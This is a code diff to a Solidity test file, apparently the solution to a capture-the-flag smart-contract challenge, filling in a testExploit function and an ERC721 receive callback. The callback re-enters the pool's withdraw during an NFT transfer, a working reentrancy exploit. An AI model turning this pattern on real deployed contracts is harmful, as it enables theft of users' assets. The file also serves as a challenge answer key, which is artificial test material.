@@ -20,7 +20,22 @@ contract PoolTest is Test {
         base.setup();
     }
 
-    function testExploit() public {}
+    function testExploit() public {
+        nft = base.nft();
+        pool = base.pool();
+        uint256 tokenId = base.tokenId();
+        nft.approve(address(pool), tokenId);
+        pool.deposit(tokenId);
+        pool.withdraw(tokenId);
+        base.solve();
+        assertTrue(base.isSolved());
+    }
 
-    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {}
+    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
+        if (times++ == 0) {
+            nft.transferFrom(address(this), address(pool), tokenId);
+            pool.withdraw(tokenId);
+        }
+        return this.onERC721Received.selector;
+    }
 }
